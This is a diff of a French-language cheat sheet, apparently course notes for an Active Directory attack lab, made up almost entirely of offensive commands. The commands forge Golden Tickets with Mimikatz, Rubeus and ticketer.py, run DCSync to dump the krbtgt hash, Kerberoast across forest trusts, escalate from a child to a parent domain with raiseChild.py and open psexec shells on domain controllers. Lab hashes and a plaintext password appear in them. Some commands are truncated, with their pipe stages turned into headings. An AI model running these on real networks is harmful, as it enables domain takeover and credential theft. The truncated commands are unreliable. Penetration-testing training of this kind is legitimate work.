+### Utilise `Mimikatz` pour créer un `Golden Ticket` depuis un hôte basé sur Windows.
+
 ```bash
 `mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt`
-```shell
-### Utilise Rubeus pour créer un Golden Ticket depuis un hôte basé sur Windows.
+```
+
+### Utilise `Rubeus` pour créer un `Golden Ticket` depuis un hôte basé sur Windows.
+
 ```bash
 `.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt`
-```shell
-### Utilise Mimikatz pour effectuer une attaque DCSync depuis un hôte basé sur Windows.
+```
+
+### Utilise `Mimikatz` pour effectuer une attaque DCSync depuis un hôte basé sur Windows.
+
 ```bash
 `mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm`
-```shell
+```
+
 ### Outil Impacket utilisé pour effectuer une attaque DCSync depuis un hôte basé sur Linux.
+
 ```bash
 `secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt`
-```shell
-### Outil Impacket utilisé pour effectuer une attaque de force brute SID depuis un hôte basé sur Linux.
+```
+
+### Outil Impacket utilisé pour effectuer une attaque de `force brute SID` depuis un hôte basé sur Linux.
+
 ```bash
 `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240`
-```shell
-### grep "Domain SID"
+```
+
+### grep "Domain SID"`
+
 ```bash
 `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 \
-```shell
-### grep -B12 "Enterprise Admins"
+```
+
+### grep -B12 "Enterprise Admins"`
+
 ```bash
 `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 \
-```shell
-### Outil Impacket utilisé pour créer un Golden Ticket depuis un hôte basé sur Linux.
+```
+
+### Outil Impacket utilisé pour créer un `Golden Ticket` depuis un hôte basé sur Linux.
+
 ```bash
 `ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker`
-```shell
-### Utilisé pour définir la variable d'environnement KRB5CCNAME depuis un hôte basé sur Linux.
+```
+
+### Utilisé pour définir la `variable d'environnement KRB5CCNAME` depuis un hôte basé sur Linux.
+
 ```bash
 `export KRB5CCNAME=hacker.ccache`
-```shell
+```
+
 ### Outil Impacket utilisé pour établir une session shell avec un contrôleur de domaine cible depuis un hôte basé sur Linux.
+
 ```bash
 `psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5`
-```shell
+```
+
 ### Outil Impacket qui effectue automatiquement une attaque qui permet l'escalade de privilèges du domaine enfant vers le domaine parent.
+
 ```bash
 `raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm`
-```shell
+```
+
 ## Relations de Confiance - Inter-Forêts
 
-### select SamAccountName
+### select SamAccountName`
+
 ```bash
 `Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL \
-```shell
-### select samaccountname,memberof
+```
+
+### select samaccountname,memberof`
+
 ```bash
 `Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc \
-```shell
-### Utilise Rubeus pour effectuer une attaque Kerberoasting contre un domaine Windows cible (/domain:FREIGHTLOGISTICS.local) depuis un hôte basé sur Windows.
+```
+
+### Utilise `Rubeus` pour effectuer une attaque Kerberoasting contre un domaine Windows cible (`/domain:FREIGHTLOGISTICS.local`) depuis un hôte basé sur Windows.
+
 ```bash
 `.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap`
-```shell
+```
+
 ### Outil PowerView utilisé pour énumérer les groupes avec des utilisateurs qui n'appartiennent pas au domaine depuis un hôte basé sur Windows.
+
 ```bash
 `Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL`
-```shell
+```
+
 ### Cmdlet PowerShell utilisé pour se connecter à distance à un système Windows cible depuis un hôte basé sur Windows.
+
 ```bash
 `Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator`
-```shell
-### Outil Impacket utilisé pour demander (-request) le ticket TGS d'un compte dans un domaine Windows cible (-target-domain) depuis un hôte basé sur Linux.
+```
+
+### Outil Impacket utilisé pour demander (`-request`) le ticket TGS d'un compte dans un domaine Windows cible (`-target-domain`) depuis un hôte basé sur Linux.
+
 ```bash
 `GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley`
-```shell
-### Exécute l'implémentation Python de BloodHound contre un domaine Windows cible depuis un hôte basé sur Linux.
+```
+
+### Exécute l'implémentation Python de `BloodHound` contre un domaine Windows cible depuis un hôte basé sur Linux.
+
 ```bash
 `bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2`
-```shell
-### Utilisé pour compresser plusieurs fichiers en un seul fichier .zip à télécharger dans l'interface BloodHound.
+```
+
+### Utilisé pour compresser plusieurs fichiers en un seul fichier `.zip` à télécharger dans l'interface BloodHound.
+
 ```bash
 `zip -r ilfreight_bh.zip *.json`
-```shell
+```
 
 ## XSS
 
